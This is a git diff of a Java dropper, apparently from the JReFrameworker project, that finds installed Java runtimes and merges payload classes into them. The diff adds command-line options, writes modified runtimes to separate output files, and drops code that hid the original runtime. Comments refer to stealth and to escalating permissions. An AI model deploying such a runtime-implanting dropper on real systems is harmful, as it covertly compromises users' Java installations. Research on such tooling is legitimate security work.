@@ -3,6 +3,7 @@ import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.HashMap;
 import java.util.HashSet;
 import java.util.LinkedList;
@@ -13,8 +14,6 @@ import jreframeworker.engine.Engine;
 
 // TODO: Going to need to escalate permissions, see https://github.com/rritoch/super-user-application
 public class Main {
-
-	private static final boolean VERBOSE = true;
 	
 	// jar contents
 	private static final String CONFIG_FILE = "config";
@@ -39,8 +38,96 @@ public class Main {
 		"C:\\Windows\\SysWOW64\\Java\\"
 	};
 	
+	private static final String VERSION_LONG_ARGUMENT = "--version";
+	private static final String VERSION_SHORT_ARGUMENT = "-v";
+	private static final String VERSION_DESCRIPTION = "1.1.1";
+	
+	private static final String OUTPUT_DIRECTORY_LONG_ARGUMENT = "--output-directory";
+	private static final String OUTPUT_DIRECTORY_SHORT_ARGUMENT = "-o";
+	private static final String OUTPUT_DIRECTORY_DESCRIPTION = "   Specifies the output directory to save modified runtimes,\n" 
+															 + "                         if not specified output files will be written as temporary\n"
+															 + "                         files.";
+	private static File outputDirectory = null;
+	
+	private static final String PRINT_PAYLOADS_LONG_ARGUMENT = "--print-payloads";
+	private static final String PRINT_PAYLOADS_SHORT_ARGUMENT = "-pp";
+	private static final String PRINT_PAYLOADS_DESCRIPTION = "    Prints the payloads of the dropper and exits.";
+	private static boolean printPayloads = false;
+	
+	private static final String SEARCH_DIRECTORIES_LONG_ARGUMENT = "--search-directories";
+	private static final String SEARCH_DIRECTORIES_SHORT_ARGUMENT = "-s";
+	private static final String SEARCH_DIRECTORIES_DESCRIPTION = " Specifies a comma separated list of directory paths to\n"
+																+ "                         search for runtimes, if not specified a default set of\n"
+																+ "                         search directories will be used.";
+	
+	private static final String VERBOSE_LONG_ARGUMENT = "--verbose";
+	private static final String VERBOSE_DIRECTORIES_DESCRIPTION = "                Prints debug information.";
+	private static boolean verbose = false;
+	
+	private static final String HELP_LONG_ARGUMENT = "--help";
+	private static final String HELP_SHORT_ARGUMENT = "-h";
+	private static final String HELP_DESCRIPTION = "Usage: java -jar dropper.jar [options]\n" 
+													+ HELP_LONG_ARGUMENT + ", " + HELP_SHORT_ARGUMENT + "               Prints this menu and exits.\n"
+													+ OUTPUT_DIRECTORY_LONG_ARGUMENT + ", " + OUTPUT_DIRECTORY_SHORT_ARGUMENT + OUTPUT_DIRECTORY_DESCRIPTION + "\n"
+													+ PRINT_PAYLOADS_LONG_ARGUMENT + ", " + PRINT_PAYLOADS_SHORT_ARGUMENT + PRINT_PAYLOADS_DESCRIPTION + "\n"
+													+ SEARCH_DIRECTORIES_LONG_ARGUMENT + ", " + SEARCH_DIRECTORIES_SHORT_ARGUMENT + SEARCH_DIRECTORIES_DESCRIPTION + "\n"
+													+ VERBOSE_LONG_ARGUMENT + VERBOSE_DIRECTORIES_DESCRIPTION + "\n"
+													+ VERSION_LONG_ARGUMENT + ", " + VERSION_SHORT_ARGUMENT + "            Prints the version of the dropper and exists.";
+	
 	@SuppressWarnings("unchecked")
 	public static void main(String[] args){
+		
+		String[] searchPaths = null;
+		for(int i=0; i<args.length; i++){
+			if(args[i].equals(HELP_LONG_ARGUMENT) || args[i].equals(HELP_SHORT_ARGUMENT)){
+				System.out.println(HELP_DESCRIPTION);
+				System.exit(0);
+			}
+			
+			else if(args[i].equals(OUTPUT_DIRECTORY_LONG_ARGUMENT) || args[i].equals(OUTPUT_DIRECTORY_SHORT_ARGUMENT)){
+				try {
+					outputDirectory = new File(args[++i]);
+					outputDirectory.mkdirs();
+					if(!outputDirectory.exists()){
+						throw new Exception("Unable to create output directory.");
+					}
+				} catch (Exception e){
+					System.err.println("Invalid argument.  Option [" 
+							+ OUTPUT_DIRECTORY_LONG_ARGUMENT + ", " + OUTPUT_DIRECTORY_SHORT_ARGUMENT
+							+ "+ ] requires a valid output directory.");
+					System.exit(1);
+				}
+			}
+			
+			else if(args[i].equals(PRINT_PAYLOADS_LONG_ARGUMENT) || args[i].equals(PRINT_PAYLOADS_SHORT_ARGUMENT)){
+				printPayloads = true;
+			}
+			
+			else if(args[i].equals(SEARCH_DIRECTORIES_LONG_ARGUMENT) || args[i].equals(SEARCH_DIRECTORIES_SHORT_ARGUMENT)){
+				try {
+					searchPaths = args[++i].split(",");
+				} catch (Exception e){
+					System.err.println("Invalid argument.  Option [" 
+							+ SEARCH_DIRECTORIES_LONG_ARGUMENT + ", " + SEARCH_DIRECTORIES_SHORT_ARGUMENT
+							+ "+ ] requires a comma seperated list of search directories.");
+					System.exit(1);
+				}
+			}
+			
+			else if(args[i].equals(VERBOSE_LONG_ARGUMENT)){
+				verbose = true;
+			}
+
+			else if(args[i].equals(VERSION_LONG_ARGUMENT) || args[i].equals(VERSION_SHORT_ARGUMENT)){
+				System.out.println(VERSION_DESCRIPTION);
+				System.exit(0);
+			}
+			
+			else {
+				System.out.println("Invalid argument: " + args[i]);
+				System.exit(1);
+			}
+		}
 		
 		// load configurations
 		HashMap<String,Object> configurations = new HashMap<String,Object>();
@@ -73,9 +160,15 @@ public class Main {
 			}
 		}
 		scanner.close();
-		
+
 		// load class payloads
 		ArrayList<String> classFiles = ((ArrayList<String>) configurations.get(CLASS_FILE));
+		
+		if(printPayloads){
+			System.out.println("Payloads: " + classFiles.toString());
+			System.exit(0);
+		}
+		
 		byte[][] payloads = new byte[classFiles.size()][];
 		for(int i=0; i<classFiles.size(); i++){
 			String classFile = classFiles.get(i);
@@ -84,28 +177,38 @@ public class Main {
 				byte[] payloadBytes = getBytes(classFileStream);
 				payloads[i] = payloadBytes;
 			} catch (Exception e) {
-				if(VERBOSE) System.err.println("Could not load: " + PAYLOAD_DIRECTORY + "/" + classFile);
-				if(VERBOSE) e.printStackTrace();
+				if(verbose) System.err.println("Could not load: " + PAYLOAD_DIRECTORY + "/" + classFile);
+				if(verbose) e.printStackTrace();
 			}
 		}
 		
-		if(VERBOSE) System.out.println(configurations);
-		if(VERBOSE) System.out.println(classFiles);
+		if(verbose) System.out.println(configurations);
+		if(verbose) System.out.println(classFiles);
 		
-		// rework runtimes
+		// modify runtimes
 		LinkedList<File> runtimes = new LinkedList<File>();
-		for(File runtime : !runtimes.isEmpty() ? runtimes : getRuntimes()){
+		for(File runtime : !runtimes.isEmpty() ? runtimes : getRuntimes(searchPaths)){
 			try {
-				modifyRuntime(runtime, configurations.get(MERGE_RENAME_PREFIX).toString(), payloads);
-				if(VERBOSE) System.out.println("Modified: " + runtime.getAbsolutePath());
+				File outputRuntime = outputDirectory == null ? File.createTempFile(runtime.getName(), ".jar") : getOutputRuntimeFile(runtime, outputDirectory);
+				modifyRuntime(runtime, configurations.get(MERGE_RENAME_PREFIX).toString(), outputRuntime, payloads);
+				System.out.println("\nOriginal Runtime: " + runtime.getAbsolutePath() + "\n" + "Modified Runtime: " + outputRuntime.getAbsolutePath());
 			} catch (Exception e) {
-				if(VERBOSE) System.err.println("Could not modify runtime: " + runtime.getAbsolutePath());
-				if(VERBOSE) e.printStackTrace();
+				if(verbose) System.err.println("Could not modify runtime: " + runtime.getAbsolutePath());
+				if(verbose) e.printStackTrace();
 			}
 		}
-		if(VERBOSE) System.out.println("Finished.");
+		if(verbose) System.out.println("Finished.");
 	}
 	
+	private static File getOutputRuntimeFile(File runtime, File outputDirectory) {
+		File outputRuntime = new File(outputDirectory.getAbsolutePath() + File.separatorChar + runtime.getName());
+		int num = 2;
+		while(outputRuntime.exists()){
+			outputRuntime = new File(outputDirectory.getAbsolutePath() + File.separatorChar + runtime.getName().replace(".jar", "_") + num++ + ".jar");
+		}
+		return outputRuntime;
+	}
+
 	private static byte[] getBytes(InputStream is) throws IOException {
 		int len;
 		int size = 1024;
@@ -123,19 +226,30 @@ public class Main {
 		return names;
 	}
 	
-	private static LinkedList<File> getRuntimes(){
-		if(VERBOSE) System.out.println("Searching for runtimes...");
+	private static LinkedList<File> getRuntimes(String[] searchPaths){
 		HashSet<String> runtimeNames = getRuntimeNames();
 		LinkedList<File> runtimes = new LinkedList<File>();
 		
 		// establish a set of directories to search for runtimes
 		LinkedList<File> searchDirectories = new LinkedList<File>();
 
-		// look for known jvm locations
-		for(String path : JVM_LOCATIONS){
-			File location = new File(path);
-			if(location.exists()){
-				searchDirectories.add(location);
+		if(searchPaths != null){
+			if(verbose) System.out.println("Searching: " + Arrays.toString(searchPaths));
+			// look for specified jvm locations
+			for(String path : searchPaths){
+				File location = new File(path);
+				if(location.exists()){
+					searchDirectories.add(location);
+				}
+			}
+		} else {
+			// look for known jvm locations
+			if(verbose) System.out.println("Searching: " + Arrays.toString(JVM_LOCATIONS));
+			for(String path : JVM_LOCATIONS){
+				File location = new File(path);
+				if(location.exists()){
+					searchDirectories.add(location);
+				}
 			}
 		}
 		
@@ -143,13 +257,14 @@ public class Main {
 		for(File searchDirectory : searchDirectories){
 			runtimes.addAll(search(searchDirectory, runtimeNames));
 		}
-		
-		// unknown location, expand search to entire file system
-		if(runtimes.isEmpty()){
-			for(File rootDirectory : File.listRoots()){
-				runtimes.addAll(search(rootDirectory, runtimeNames));
-			}	
-		}
+
+		// Note: removed this functionality, as it is way to expensive...not very stealthy
+//		// unknown location, expand search to entire file system
+//		if(runtimes.isEmpty()){
+//			for(File rootDirectory : File.listRoots()){
+//				runtimes.addAll(search(rootDirectory, runtimeNames));
+//			}	
+//		}
 
 		return runtimes;
 	}
@@ -173,14 +288,13 @@ public class Main {
 		}
 	}
 	
-	private static void modifyRuntime(File runtime, String mergeRenamePrefix, byte[]... classFiles) throws JarException, IOException {
-		Engine engine = new Engine(runtime, mergeRenamePrefix);
+	// TODO: Consider accepting and writing to an output stream instead of a File so that we could generically write to a file, memory, stdout, etc.
+	private static void modifyRuntime(File originalRuntime, String mergeRenamePrefix, File outputRuntime, byte[]... classFiles) throws JarException, IOException {
+		Engine engine = new Engine(originalRuntime, mergeRenamePrefix);
 		for(byte[] classFile : classFiles){
 			engine.process(classFile);
 		}
-		// just hide the original runtime
-		runtime.renameTo(new File(runtime.getParentFile().getAbsolutePath() + File.separatorChar + "." + runtime.getName()));
-		engine.save(runtime);
+		engine.save(outputRuntime);
 	}
 	
 }
